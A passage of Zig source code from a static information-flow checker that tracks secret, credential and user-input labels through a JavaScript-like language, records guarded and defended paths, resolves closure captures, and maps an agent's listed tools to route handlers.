    /// which this covers. Null when the module exports no such function.
    ///
    /// Only the named function's body is walked. Its own calls into modules
    /// this checker cannot resolve stay `unknown`, so the answer never claims
    /// more than one file's worth of evidence. Allocation failure is returned
    /// rather than letting a partial label set look complete.
    pub fn exportedReturnLabels(self: *FlowChecker, name: []const u8) !?LabelSet {
        self.scanImports();
        self.scanFunctionDecls();
        self.resolveCaptures();
        // The imported file's own module-level constants: an exported function
        // that returns one answers with its labels, not with `.unknown`.
        self.walkModuleDeclarations();
        if (self.allocation_failed) return error.OutOfMemory;

        const fn_node = self.findFunctionByName(name) orelse return null;
        const func = self.ir_view.getFunction(fn_node) orelse return null;

        const body_tag = self.ir_view.getTag(func.body) orelse return null;
        const labels = if (body_tag == .block or body_tag == .program or body_tag == .return_stmt) blk: {
            var collected = LabelSet.empty;
            const saved = self.summary_returns;
            self.summary_returns = &collected;
            defer self.summary_returns = saved;
            self.walkStmt(func.body);
            break :blk collected;
        } else self.exprBodyLabels(func.body);
        if (self.allocation_failed) return error.OutOfMemory;
        return labels;
    }

    /// The function declaration bound to `name` at module scope, or null.
    fn findFunctionByName(self: *const FlowChecker, name: []const u8) ?NodeIndex {
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            if (tag != .function_decl and tag != .var_decl) continue;
            const vd = self.ir_view.getVarDecl(idx) orelse continue;
            if (vd.init == null_node) continue;
            if (tag == .var_decl) {
                const init_tag = self.ir_view.getTag(vd.init) orelse continue;
                if (init_tag != .function_expr and init_tag != .arrow_function) continue;
            }
            const decl_name = self.resolveAtomName(vd.binding.name_atom) orelse continue;
            if (std.mem.eql(u8, decl_name, name)) return vd.init;
        }
        return null;
    }

    /// After the walk, record `.never_reached` defended paths for the leak
    /// families: a secret/credential binding was read but no sink consumed it.
    /// Only fires when such a binding exists, so handlers that touch no secrets
    /// carry no spurious card. The user_input family is intentionally excluded
    /// here - the request parameter always carries `.user_input`, so a
    /// never-reached scan on it would fire on every handler.
    fn recordContainedSecrets(self: *FlowChecker) void {
        const Pair = struct { tag: counterexample.PropertyTag, label: DataLabel, held: bool };
        const pairs = [_]Pair{
            .{ .tag = .no_secret_leakage, .label = .secret, .held = self.properties.no_secret_leakage },
            .{ .tag = .no_credential_leakage, .label = .credential, .held = self.properties.no_credential_leakage },
        };
        for (pairs) |p| {
            if (!p.held) continue;
            if (self.hasDefendedPath(p.tag)) continue;
            if (!self.anyBindingHasLabel(p.label)) continue;
            self.defended_paths.append(self.allocator, .{
                .property = p.tag,
                .safe_form = .never_reached,
            }) catch self.markAllocationFailure();
        }
    }

    fn anyBindingHasLabel(self: *const FlowChecker, label: DataLabel) bool {
        var it = self.binding_labels.valueIterator();
        while (it.next()) |ls| {
            if (ls.has(label)) return true;
        }
        return false;
    }

    fn hasDefendedPath(self: *const FlowChecker, tag: counterexample.PropertyTag) bool {
        for (self.defended_paths.items) |d| {
            if (d.property == tag) return true;
        }
        return false;
    }

    /// Record a `.validated` defended path for `tag` if its guard can be named
    /// from the sink value's `result.value` provenance. No guard found -> no
    /// path (the property still holds; it just carries no resisted card).
    fn recordValidated(
        self: *FlowChecker,
        tag: counterexample.PropertyTag,
        value_expr: NodeIndex,
        sink_node: NodeIndex,
        sink_label: []const u8,
    ) void {
        if (self.hasDefendedPath(tag)) return;
        const guard = self.findGuardInExpr(value_expr) orelse return;
        const guard_loc = self.ir_view.getLoc(guard.node);
        const sink_loc = self.ir_view.getLoc(sink_node);
        self.defended_paths.append(self.allocator, .{
            .property = tag,
            .safe_form = .validated,
            .guard_func = guard.func,
            .guard_line = if (guard_loc) |l| l.line else 0,
            .sink_label = sink_label,
            .sink_line = if (sink_loc) |l| l.line else 0,
        }) catch self.markAllocationFailure();
    }

    /// Walk an expression for the validator that cleared the taint: the first
    /// `<ident>.value` whose binding is a tracked validation result, or a bare
    /// identifier that is itself such a binding. Mirrors `inferLabels`'
    /// recursion over the shapes that can carry a `.validated` label.
    fn findGuardInExpr(self: *const FlowChecker, node: NodeIndex) ?GuardInfo {
        if (node == null_node) return null;
        const tag = self.ir_view.getTag(node) orelse return null;
        switch (tag) {
            .identifier => {
                const binding = self.bindingAt(node) orelse return null;
                const key = packBindingKey(binding.scope_id, binding.slot);
                return self.result_binding_guard.get(key);
            },
            .member_access, .optional_chain => {
                const member = self.ir_view.getMember(node) orelse return null;
                // `result.value` is the canonical validated-value access.
                if (self.resolveAtomName(member.property)) |prop_name| {
                    if (std.mem.eql(u8, prop_name, "value")) {
                        const obj_tag = self.ir_view.getTag(member.object) orelse return null;
                        if (obj_tag == .identifier) {
                            const binding = self.bindingAt(member.object) orelse return null;
                            const key = packBindingKey(binding.scope_id, binding.slot);
                            if (self.result_binding_guard.get(key)) |g| return g;
                        }
                    }
                }
                return self.findGuardInExpr(member.object);
            },
            .binary_op => {
                const bin = self.ir_view.getBinary(node) orelse return null;
                return self.findGuardInExpr(bin.left) orelse self.findGuardInExpr(bin.right);
            },
            .ternary => {
                const t = self.ir_view.getTernary(node) orelse return null;
                return self.findGuardInExpr(t.then_branch) orelse self.findGuardInExpr(t.else_branch);
            },
            .object_literal => {
                const obj = self.ir_view.getObject(node) orelse return null;
                var i: u16 = 0;
                while (i < obj.properties_count) : (i += 1) {
                    const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                    const prop_tag = self.ir_view.getTag(prop_idx) orelse continue;
                    if (prop_tag == .object_property) {
                        const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                        if (self.findGuardInExpr(prop.value)) |g| return g;
                    } else if (prop_tag == .object_spread) {
                        if (self.ir_view.getOptValue(prop_idx)) |val| {
                            if (self.findGuardInExpr(val)) |g| return g;
                        }
                    }
                }
                return null;
            },
            .array_literal => {
                const arr = self.ir_view.getArray(node) orelse return null;
                var i: u16 = 0;
                while (i < arr.elements_count) : (i += 1) {
                    const elem_idx = self.ir_view.getListIndex(arr.elements_start, i);
                    if (self.findGuardInExpr(elem_idx)) |g| return g;
                }
                return null;
            },
            .spread, .unary_op => {
                if (self.ir_view.getOptValue(node)) |operand| return self.findGuardInExpr(operand);
                return null;
            },
            .assignment => {
                const asgn = self.ir_view.getAssignment(node) orelse return null;
                return self.findGuardInExpr(asgn.value);
            },
            .computed_access => {
                const member = self.ir_view.getMember(node) orelse return null;
                return self.findGuardInExpr(member.object);
            },
            // exhaustive: null means "no guard found here", which leaves the
            // value treated as unguarded. A missed guard adds diagnostics; it
            // cannot remove one.
            else => return null,
        }
    }

    pub fn getDiagnostics(self: *const FlowChecker) []const Diagnostic {
        return self.diagnostics.items;
    }

    /// Passing-case evidence: defended paths for held flow properties.
    pub fn getDefendedPaths(self: *const FlowChecker) []const DefendedPath {
        return self.defended_paths.items;
    }

    pub fn getProperties(self: *const FlowChecker) FlowProperties {
        return self.properties;
    }

    /// Install the consumer's declared classifications (M4 T4). Borrowed: the
    /// declaration must outlive the checker. Every entry starts `absent`.
    pub fn setDeclaration(self: *FlowChecker, decl: *const Declaration) std.mem.Allocator.Error!void {
        const statuses = try self.allocator.alloc(EntryStatus, decl.classifications.len);
        errdefer self.allocator.free(statuses);
        @memset(statuses, .absent);
        var sources: std.ArrayListUnmanaged(DeclaredSource) = .empty;
        errdefer sources.deinit(self.allocator);
        for (decl.classifications) |entry| {
            if (findSource(sources.items, entry.source_kind, entry.source_name) == null) {
                try sources.append(self.allocator, .{ .kind = entry.source_kind, .name = entry.source_name });
            }
        }
        if (self.entry_status.len > 0) self.allocator.free(self.entry_status);
        self.origin_sources.deinit(self.allocator);
        self.entry_status = statuses;
        self.origin_sources = sources;
        self.declaration = decl;
    }

    pub fn setTypeChecker(self: *FlowChecker, checker: *type_checker_mod.TypeChecker) void {
        self.type_checker = checker;
    }

    /// The P8 status of each classification, in the declaration's order.
    pub fn classificationStatuses(self: *const FlowChecker) []const EntryStatus {
        return self.entry_status;
    }

    pub fn formatDiagnostics(self: *const FlowChecker, source: stripper.SourceView, writer: anytype) !void {
        for (self.diagnostics.items) |diag| {
            const loc = self.ir_view.getLoc(diag.node) orelse continue;
            const span = loc.span();
            try source.writeDiagnostic(.{
                .severity = diag.severity.label(),
                .code = diagnostic_catalog.flowCode(diag.kind),
                .message = diag.message,
                .line = loc.line,
                .column = loc.column,
                .start_offset = span.start,
                .end_offset = span.end,
                .help = diag.help,
            }, writer);
        }
    }

    /// Resolve the index to read: injected, or private on first use.
    fn resolveFacts(self: *FlowChecker) ?*const module_facts_mod.ModuleFacts {
        if (self.facts) |f| return f;
        if (self.owned_facts == null) {
            self.owned_facts = module_facts_mod.ModuleFacts.build(
                self.allocator,
                self.ir_view,
                self.atoms,
                null,
            ) catch {
                self.markAllocationFailure();
                return null;
            };
        }
        return &self.owned_facts.?;
    }

    /// Populate the three slot-keyed collections and the env slot.
    ///
    /// `.builtin` only, translating the legacy `fromSpecifier(module) == null`
    /// skip: that lookup never consults a manifest registry, so a
    /// partner-registered module was skipped before and stays skipped.
    /// True when calling this export can return a different value in a later
    /// run of the same request.
    ///
    /// Two sources, and both are needed. The capability set catches a clock
    /// read or a draw of randomness; it falls back to the module's declared set
    /// when the export declares none, which is the same inheritance rule effect
    /// inference applies.
    ///
    /// A read from mutable module state is the second, and it cannot be read
    /// off the capabilities. `sqlOne` declares `.sqlite` and `.policy_check`
    /// and no clock, yet the row it returns is whatever the last write left
    /// there, so a handler embedding that row in its response was proving
    /// `deterministic` while its answer moved under it. `cacheStats` was caught
    /// only by accident: `zttp:cache` declared `.clock` at module level for the
    /// expiry checks in `cacheGet`, and tightening the rows to what each export
    /// really reaches removed the coincidence and exposed the same hole.
    ///
    /// `stateful` and a `.read` effect is the precise test for "another request
    /// could have written what this returns". It selects `cacheGet`,
    /// `cacheStats`, `sqlOne`, `sqlMany`, `getWebSockets`, and
    /// `deserializeAttachment`, and it excludes `zttp:validate`, whose state is
    /// a schema registry the handler compiles from literals in its own run.
    fn exportReadsVaryingSource(
        binding: *const mb.ModuleBinding,
        func: *const mb.FunctionBinding,
    ) bool {
        if (binding.stateful and func.effect == .read) return true;

        const caps = func.required_capabilities orelse binding.required_capabilities;
        for (caps) |cap| {
            if (cap == .clock or cap == .random) return true;
        }
        return false;
    }

    fn scanImports(self: *FlowChecker) void {
        const facts = self.resolveFacts() orelse return;
        for (facts.imports.items) |rec| {
            if (rec.resolution != .builtin) continue;
            const entry = builtin_modules.findExport(rec.module_specifier, rec.imported_name) orelse continue;

            // A value produced by an export that reads a clock, draws
            // randomness, or reads mutable module state differs between runs of
            // the same request. The capability half is seeded from the export's
            // own set rather than declared on each binding, so it tracks the
            // per-export rows automatically: `jwtVerify` carries it and
            // `parseBearer` does not, because only one of them declares
            // `.clock`.
            var labels = entry.func.return_labels;
            if (exportReadsVaryingSource(entry.binding, entry.func)) labels.nondeterministic = true;

            if (!labels.isEmpty()) {
                self.module_fn_labels.put(
                    self.allocator,
                    rec.slot,
                    labels,
                ) catch self.markAllocationFailure();
            }
            self.module_fn_meta.put(
                self.allocator,
                rec.slot,
                .{
                    .module = entry.binding.name,
                    .func = entry.func.name,
                    .returns = entry.func.returns,
                },
            ) catch self.markAllocationFailure();
            if (entry.func.derives_from_args) {
                self.module_fn_arg_derived.put(self.allocator, rec.slot, {}) catch
                    self.markAllocationFailure();
            }
            if (entry.func.declassify_bound_arg) |bound| {
                self.module_fn_declassify_bound.put(self.allocator, rec.slot, bound) catch
                    self.markAllocationFailure();
            }
            // Matched on the imported name, not the local alias, exactly as
            // before: `import { env as e }` still sets this slot.
            if (std.mem.eql(u8, rec.imported_name, "env")) {
                self.env_fn_slot = rec.slot;
            }
        }
    }

    /// Index user function declarations (and function-valued const/let
    /// bindings) so call-label inference can summarize callee bodies instead
    /// of dropping labels at every user-defined call boundary.
    fn scanFunctionDecls(self: *FlowChecker) void {
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            if (tag == .import_decl) {
                self.scanImportBindings(idx);
                continue;
            }
            if (tag != .function_decl and tag != .var_decl) continue;

            // function_decl shares the var_decl layout: binding + init
            // function expression.
            const vd = self.ir_view.getVarDecl(idx) orelse continue;
            if (vd.init == null_node) continue;
            if (tag == .var_decl) {
                const init_tag = self.ir_view.getTag(vd.init) orelse continue;
                if (init_tag != .function_expr and init_tag != .arrow_function) continue;
            }
            const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
            self.user_fn_decls.put(self.allocator, key, vd.init) catch self.markAllocationFailure();
        }
    }

    /// Record the local binding of each specifier of one `import` declaration.
    fn scanImportBindings(self: *FlowChecker, decl_node: NodeIndex) void {
        const import_decl = self.ir_view.getImportDecl(decl_node) orelse return;
        var j: u8 = 0;
        while (j < import_decl.specifiers_count) : (j += 1) {
            const spec_idx = self.ir_view.getListIndex(import_decl.specifiers_start, j);
            const spec = self.ir_view.getImportSpec(spec_idx) orelse continue;
            const key = packBindingKey(spec.local_binding.scope_id, spec.local_binding.slot);
            self.import_bindings.put(self.allocator, key, {}) catch self.markAllocationFailure();
        }
    }

    /// The program node, or null when the IR holds none. A parse produces
    /// exactly one, created last, so the search starts from the end.
    fn programNode(self: *const FlowChecker) ?NodeIndex {
        var idx = self.ir_view.nodeCount();
        while (idx > 0) {
            idx -= 1;
            const node: NodeIndex = @intCast(idx);
            if (self.ir_view.getTag(node) == .program) return node;
        }
        return null;
    }

    /// The binding an identifier node names. A captured read comes back as the
    /// declaration it captures, so every key the checker builds from it
    /// (labels, origins, function declarations, parameter values) is the
    /// declaration's own key. A capture that `resolveCaptures` could not place
    /// keeps kind `.upvalue` and a scope that no declaration has, so its key
    /// cannot collide with a local or a parameter.
    fn bindingAt(self: *const FlowChecker, node: NodeIndex) ?ir.BindingRef {
        const binding = self.ir_view.getBinding(node) orelse return null;
        if (binding.kind != .upvalue) return binding;
        if (self.capture_targets.get(node)) |target| return target;
        return .{
            .scope_id = ir.null_scope,
            .slot = binding.slot,
            .name_atom = binding.name_atom,
            .kind = .upvalue,
        };
    }

    /// One declaration in scope at a point of the capture scan.
    const CaptureDecl = struct { name_atom: u16, binding: ir.BindingRef };
    const CaptureScope = std.ArrayListUnmanaged(CaptureDecl);
    /// Nesting past which the capture scan stops descending. A capture below
    /// the bound stays unresolved and reads as `.unknown`.
    const max_capture_depth = 256;

    /// Resolve every captured read to the declaration it names, by name,
    /// against the declarations lexically in scope at the read: a stack that
    /// grows at each declaration and shrinks at the end of its block, function,
    /// loop, or match arm, as the type checker keeps its active declarations
    /// (`boundCallableMetadata`). This is a pass over the IR and not part of the
    /// label walk, because the label walk reaches a closure from wherever it is
    /// called - a callee summary, a module callback - and the declarations
    /// active there are not the ones the closure captured. A module-level
    /// declaration is never captured: the scope analyzer reads it as `.global`.
    fn resolveCaptures(self: *FlowChecker) void {
        const program = self.programNode() orelse return;
        var scope: CaptureScope = .empty;
        defer scope.deinit(self.allocator);
        self.captureScan(program, &scope, 0);
    }

    fn pushCaptureDecl(self: *FlowChecker, scope: *CaptureScope, binding: ir.BindingRef) void {
        if (binding.kind == .global or binding.kind == .undeclared_global or binding.kind == .upvalue) return;
        const decl: CaptureDecl = .{ .name_atom = binding.name_atom, .binding = binding };
        scope.append(self.allocator, decl) catch self.markAllocationFailure();
    }

    /// Place a captured read: the innermost declaration in scope with its name.
    fn recordCapture(self: *FlowChecker, node: NodeIndex, scope: *const CaptureScope) void {
        const binding = self.ir_view.getBinding(node) orelse return;
        if (binding.kind != .upvalue) return;
        var i = scope.items.len;
        while (i > 0) {
            i -= 1;
            const decl = scope.items[i];
            if (decl.name_atom != binding.name_atom) continue;
            self.capture_targets.put(self.allocator, node, decl.binding) catch self.markAllocationFailure();
            return;
        }
    }

    /// Declare the bindings of a match-arm pattern. A record pattern field that
    /// holds an identifier is a binding; a literal, a nested pattern, or a
    /// type test declares nothing but its nested patterns may.
    fn captureScanPattern(self: *FlowChecker, pattern: NodeIndex, scope: *CaptureScope, depth: u16) void {
        if (pattern == null_node or depth >= max_capture_depth) return;
        const tag = self.ir_view.getTag(pattern) orelse return;
        switch (tag) {
            .match_pattern => {
                const obj = self.ir_view.getMatchPattern(pattern) orelse return;
                for (0..obj.props_count) |i| {
                    const prop_idx = self.ir_view.getListIndex(obj.props_start, @intCast(i));
                    const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                    if (prop.value == null_node) continue;
                    if (self.ir_view.getTag(prop.value) == .identifier) {
                        if (self.ir_view.getBinding(prop.value)) |binding| self.pushCaptureDecl(scope, binding);
                    } else {
                        self.captureScanPattern(prop.value, scope, depth + 1);
                    }
                }
            },
            .array_pattern => {
                const arr = self.ir_view.getArray(pattern) orelse return;
                for (0..arr.elements_count) |i| {
                    self.captureScanPattern(self.ir_view.getListIndex(arr.elements_start, @intCast(i)), scope, depth + 1);
                }
            },
            // exhaustive: only an object or an array pattern holds nested
            // patterns. Every other node is a literal, a type test, or a tag
            // the parser does not put in a pattern, and declares no binding.
            else => {},
        }
    }

    fn captureScanList(self: *FlowChecker, start: NodeIndex, count: usize, scope: *CaptureScope, depth: u16) void {
        for (0..count) |i| {
            self.captureScan(self.ir_view.getListIndex(start, @intCast(i)), scope, depth);
        }
    }

    fn captureScan(self: *FlowChecker, node: NodeIndex, scope: *CaptureScope, depth: u16) void {
        if (node == null_node or depth >= max_capture_depth) return;
        const tag = self.ir_view.getTag(node) orelse return;
        const next = depth + 1;
        switch (tag) {
            .identifier => self.recordCapture(node, scope),

            .program, .block => {
                const block = self.ir_view.getBlock(node) orelse return;
                const mark = scope.items.len;
                defer scope.shrinkRetainingCapacity(mark);
                self.captureScanList(block.stmts_start, block.stmts_count, scope, next);
            },

            // The binding is declared before the initializer is parsed, so an
            // initializer that names its own declaration captures it.
            .var_decl, .function_decl => {
                const vd = self.ir_view.getVarDecl(node) orelse return;
                self.pushCaptureDecl(scope, vd.binding);
                self.captureScan(vd.init, scope, next);
            },

            .export_decl => {
                const export_decl = self.ir_view.getExportDecl(node) orelse return;
                self.captureScan(export_decl.declaration, scope, next);
            },

            .export_default, .expr_stmt, .return_stmt, .spread, .object_spread => {
                if (self.ir_view.getOptValue(node)) |value| self.captureScan(value, scope, next);
            },

            .if_stmt => {
                const if_s = self.ir_view.getIfStmt(node) orelse return;
                self.captureScan(if_s.condition, scope, next);
                const mark = scope.items.len;
                self.captureScan(if_s.then_branch, scope, next);
                scope.shrinkRetainingCapacity(mark);
                self.captureScan(if_s.else_branch, scope, next);
                scope.shrinkRetainingCapacity(mark);
            },

            .for_of_stmt, .for_in_stmt => {
                const fi = self.ir_view.getForIter(node) orelse return;
                const mark = scope.items.len;
                defer scope.shrinkRetainingCapacity(mark);
                self.pushCaptureDecl(scope, fi.binding);
                self.captureScan(fi.iterable, scope, next);
                self.captureScan(fi.body, scope, next);
            },

            .for_stmt, .while_stmt, .do_while_stmt => {
                const loop = self.ir_view.getLoop(node) orelse return;
                const mark = scope.items.len;
                defer scope.shrinkRetainingCapacity(mark);
                self.captureScan(loop.init, scope, next);
                self.captureScan(loop.condition, scope, next);
                self.captureScan(loop.update, scope, next);
                self.captureScan(loop.body, scope, next);
            },

            .switch_stmt => {
                const sw = self.ir_view.getSwitchStmt(node) orelse return;
                const mark = scope.items.len;
                defer scope.shrinkRetainingCapacity(mark);
                self.captureScan(sw.discriminant, scope, next);
                self.captureScanList(sw.cases_start, sw.cases_count, scope, next);
            },

            .case_clause => {
                const cc = self.ir_view.getCaseClause(node) orelse return;
                self.captureScan(cc.test_expr, scope, next);
                self.captureScanList(cc.body_start, cc.body_count, scope, next);
            },

            .assert_stmt => {
                const assert = self.ir_view.getAssertStmt(node) orelse return;
                self.captureScan(assert.condition, scope, next);
                self.captureScan(assert.error_expr, scope, next);
            },

            .binary_op => {
                const bin = self.ir_view.getBinary(node) orelse return;
                self.captureScan(bin.left, scope, next);
                self.captureScan(bin.right, scope, next);
            },

            .unary_op => {
                const unary = self.ir_view.getUnary(node) orelse return;
                self.captureScan(unary.operand, scope, next);
            },

            .ternary => {
                const t = self.ir_view.getTernary(node) orelse return;
                self.captureScan(t.condition, scope, next);
                self.captureScan(t.then_branch, scope, next);
                self.captureScan(t.else_branch, scope, next);
            },

            .call, .method_call => {
                const call = self.ir_view.getCall(node) orelse return;
                self.captureScan(call.callee, scope, next);
                self.captureScanList(call.args_start, call.args_count, scope, next);
            },

            .member_access, .optional_chain, .computed_access => {
                const member = self.ir_view.getMember(node) orelse return;
                self.captureScan(member.object, scope, next);
                self.captureScan(member.computed, scope, next);
            },

            .assignment => {
                const asgn = self.ir_view.getAssignment(node) orelse return;
                self.captureScan(asgn.target, scope, next);
                self.captureScan(asgn.value, scope, next);
            },

            .array_literal => {
                const arr = self.ir_view.getArray(node) orelse return;
                self.captureScanList(arr.elements_start, arr.elements_count, scope, next);
            },

            .object_literal => {
                const obj = self.ir_view.getObject(node) orelse return;
                self.captureScanList(obj.properties_start, obj.properties_count, scope, next);
            },

            .object_property => {
                const prop = self.ir_view.getProperty(node) orelse return;
                self.captureScan(prop.value, scope, next);
            },

            .function_expr, .arrow_function => {
                const func = self.ir_view.getFunction(node) orelse return;
                const mark = scope.items.len;
                defer scope.shrinkRetainingCapacity(mark);
                for (0..func.params_count) |i| {
                    const param_idx = self.ir_view.getListIndex(func.params_start, @intCast(i));
                    if (self.paramBinding(param_idx)) |binding| self.pushCaptureDecl(scope, binding);
                }
                self.captureScan(func.body, scope, next);
            },

            .match_expr => {
                const match_expr = self.ir_view.getMatchExpr(node) orelse return;
                self.captureScan(match_expr.discriminant, scope, next);
                for (0..match_expr.arms_count) |i| {
                    const arm_idx = self.ir_view.getListIndex(match_expr.arms_start, @intCast(i));
                    const arm = self.ir_view.getMatchArm(arm_idx) orelse continue;
                    const mark = scope.items.len;
                    self.captureScanPattern(arm.pattern, scope, next);
                    self.captureScan(arm.body, scope, next);
                    scope.shrinkRetainingCapacity(mark);
                }
            },

            .match_type_test => {
                const test_data = self.ir_view.getMatchTypeTest(node) orelse return;
                self.captureScan(test_data.predicate, scope, next);
            },

            // exhaustive: no child holds a function or a read that this pass
            // must place. Literals and jumps have no children. Imports and the
            // remaining module forms bind no captured name. The forms the
            // parser refuses (`await`, `yield`, sequences, `try`, `throw`,
            // labels, object methods) never reach the checker, and a capture
            // inside one would stay unresolved and read as `.unknown`.
            // Arms, patterns, and parameter nodes are reached through their
            // parents above.
            .lit_int,
            .lit_float,
            .lit_string,
            .lit_bool,
            .lit_null,
            .lit_undefined,
            .object_method,
            .object_getter,
            .object_setter,
            .await_expr,
            .yield_expr,
            .sequence_expr,
            .comma_expr,
            .match_arm,
            .match_pattern,
            .throw_stmt,
            .break_stmt,
            .continue_stmt,
            .try_stmt,
            .labeled_stmt,
            .array_pattern,
            .pattern_element,
            .pattern_rest,
            .pattern_default,
            .import_decl,
            .import_specifier,
            .import_default,
            .import_namespace,
            .export_specifier,
            .export_all,
            .param_list,
            .arg_list,
            .stmt_list,
            => {},
        }
    }

    /// Walk the module-level data declarations in source order, so a read of a
    /// `.global` binding finds the labels of its initializer and the sinks in
    /// an initializer run once, as they do at load time. A function
    /// declaration or a function-valued constant is walked where it is called
    /// or rooted, not here: it holds no datum, and its body needs a request.
    fn walkModuleDeclarations(self: *FlowChecker) void {
        const program = self.programNode() orelse return;
        const block = self.ir_view.getBlock(program) orelse return;
        self.walking_module_level = true;
        defer self.walking_module_level = false;
        for (0..block.stmts_count) |i| {
            const stmt = self.ir_view.getListIndex(block.stmts_start, @intCast(i));
            var decl = stmt;
            if (self.ir_view.getTag(stmt) == .export_decl) {
                const export_decl = self.ir_view.getExportDecl(stmt) orelse continue;
                decl = export_decl.declaration;
            }
            if (decl == null_node or self.ir_view.getTag(decl) != .var_decl) continue;
            const vd = self.ir_view.getVarDecl(decl) orelse continue;
            if (vd.init != null_node) {
                const init_tag = self.ir_view.getTag(vd.init) orelse continue;
                if (init_tag == .function_expr or init_tag == .arrow_function) continue;
            }
            self.walkStmt(decl);
        }
    }

    /// Index every function value in a literal object table passed to the
    /// imported `routerMatch`. This uses the same two table shapes as the
    /// contract builder: an object literal, or a module binding initialized by
    /// an object literal. A route value resolves when it is a function value or
    /// an identifier bound to one.
    fn scanRouteFunctionRoots(self: *FlowChecker) void {
        const facts = self.resolveFacts() orelse return;
        const resolver = route_resolution.Resolver.init(self.ir_view, self.atoms, facts);
        var roots = resolver.routeRoots(self.allocator) catch {
            self.markAllocationFailure();
            return;
        };
        defer roots.deinit(self.allocator);
        for (roots.functions.items) |function| self.appendRouteFunctionRoot(function);
        if (roots.unresolved) _ = self.unknownRouteCallLabels();
    }

    /// Resolve the current agent's literal `tools` list through the same
    /// catalog route keys and `routerMatch` tables that contract extraction
    /// accepts. This is intentionally a closed read. Any missing literal,
    /// duplicate agent, unknown tool, or unresolved route sets the conservative
    /// bit; contract construction later emits the precise ZTS513 refusal.
    fn scanListedToolRoutes(self: *FlowChecker) void {
        if (self.listed_tool_routes_ready) return;
        const facts = self.resolveFacts() orelse {
            self.listed_tool_routes_unresolved = true;
            return;
        };
        const catalog_slot = for (facts.imports.items) |record| {
            if (record.resolution != .builtin) continue;
            if (std.mem.eql(u8, record.module_specifier, "zttp:tool") and
                std.mem.eql(u8, record.imported_name, "toolCatalog")) break record.slot;
        } else return;

        var catalog_call: ?Node.CallExpr = null;
        for (0..self.ir_view.nodeCount()) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            if (self.ir_view.getTag(idx) != .call) continue;
            const call = self.ir_view.getCall(idx) orelse continue;
            if (self.ir_view.getTag(call.callee) != .identifier) continue;
            const binding = self.bindingAt(call.callee) orelse continue;
            if (binding.slot != catalog_slot) continue;
            if (catalog_call != null) {
                self.listed_tool_routes_unresolved = true;
                self.listed_tool_routes_ready = true;
                return;
            }
            catalog_call = call;
        }
        const call = catalog_call orelse return;
        self.listed_tool_routes_ready = true;
        if (call.args_count != 1) {
            self.listed_tool_routes_unresolved = true;
            return;
        }
        const catalog_node = self.resolveCatalogObject(
            self.ir_view.getListIndex(call.args_start, 0),
        ) orelse {
            self.listed_tool_routes_unresolved = true;
            return;
        };
        const catalog = self.ir_view.getObject(catalog_node) orelse {
            self.listed_tool_routes_unresolved = true;
            return;
        };

        var agent_entry: ?NodeIndex = null;
        for (0..catalog.properties_count) |index| {
            const property_node = self.ir_view.getListIndex(catalog.properties_start, @intCast(index));
            if (self.ir_view.getTag(property_node) != .object_property) {
                self.listed_tool_routes_unresolved = true;
                continue;
            }
            const property = self.ir_view.getProperty(property_node) orelse {
                self.listed_tool_routes_unresolved = true;
                continue;
            };
            const entry_node = self.resolveCatalogObject(property.value) orelse {
                self.listed_tool_routes_unresolved = true;
                continue;
            };
            if (self.catalogField(entry_node, "agent") == null) continue;
            if (agent_entry != null) {
                self.listed_tool_routes_unresolved = true;
                return;
            }
            agent_entry = entry_node;
        }
        const agent = agent_entry orelse {
            self.listed_tool_routes_unresolved = true;
            return;
        };
        const agent_value = self.catalogField(agent, "agent") orelse {
            self.listed_tool_routes_unresolved = true;
            return;
        };
        const agent_object = self.resolveCatalogObject(agent_value) orelse {
            self.listed_tool_routes_unresolved = true;
            return;
        };
        const tools_node = self.catalogField(agent_object, "tools") orelse {
            self.listed_tool_routes_unresolved = true;
            return;
        };
        const tools = self.ir_view.getArray(tools_node) orelse {
            self.listed_tool_routes_unresolved = true;
            return;
        };
        if (tools.elements_count == 0) self.listed_tool_routes_unresolved = true;

        const resolver = route_resolution.Resolver.init(self.ir_view, self.atoms, facts);
        for (0..tools.elements_count) |index| {
            const tool_node = self.ir_view.getListIndex(tools.elements_start, @intCast(index));
            const tool_name = self.catalogString(tool_node) orelse {
                self.listed_tool_routes_unresolved = true;
                continue;
            };
            const tool_entry = self.catalogEntry(catalog_node, tool_name) orelse {
                self.listed_tool_routes_unresolved = true;
                continue;
            };
            if (self.catalogField(tool_entry, "agent") != null) {
                self.listed_tool_routes_unresolved = true;
                continue;
            }
            const route_node = self.catalogField(tool_entry, "route") orelse {
                self.listed_tool_routes_unresolved = true;
                continue;
            };
            const route = self.catalogString(route_node) orelse {
                self.listed_tool_routes_unresolved = true;
                continue;
            };
            var targets = resolver.resolveRouteKey(self.allocator, route) catch {
                self.markAllocationFailure();
                self.listed_tool_routes_unresolved = true;
                continue;
            };
            defer targets.deinit(self.allocator);
            if (targets.unresolved) self.listed_tool_routes_unresolved = true;
            for (targets.functions.items) |function| {
                if (std.mem.indexOfScalar(NodeIndex, self.listed_tool_route_functions.items, function) != null) continue;
                self.listed_tool_route_functions.append(self.allocator, function) catch self.markAllocationFailure();
            }
        }
    }

    fn resolveCatalogObject(self: *const FlowChecker, node: NodeIndex) ?NodeIndex {
        const tag = self.ir_view.getTag(node) orelse return null;
        if (tag == .object_literal) return node;
        if (tag != .identifier) return null;
        const binding = self.bindingAt(node) orelse return null;
        const binding_decl = self.findBindingDecl(binding) orelse return null;
        if (self.bindingIsMutated(binding) or self.bindingHasAlias(binding)) return null;
        return if (self.ir_view.getTag(binding_decl.init) == .object_literal) binding_decl.init else null;
    }

    fn catalogField(self: *const FlowChecker, object_node: NodeIndex, wanted: []const u8) ?NodeIndex {
        const catalog_object = self.ir_view.getObject(object_node) orelse return null;
        var found: ?NodeIndex = null;
        for (0..catalog_object.properties_count) |index| {
            const property_node = self.ir_view.getListIndex(catalog_object.properties_start, @intCast(index));
            if (self.ir_view.getTag(property_node) != .object_property) return null;
            const property = self.ir_view.getProperty(property_node) orelse return null;
            const name = self.getPropertyKeyName(property.key) orelse return null;
            if (!std.mem.eql(u8, name, wanted)) continue;
            if (found != null) return null;
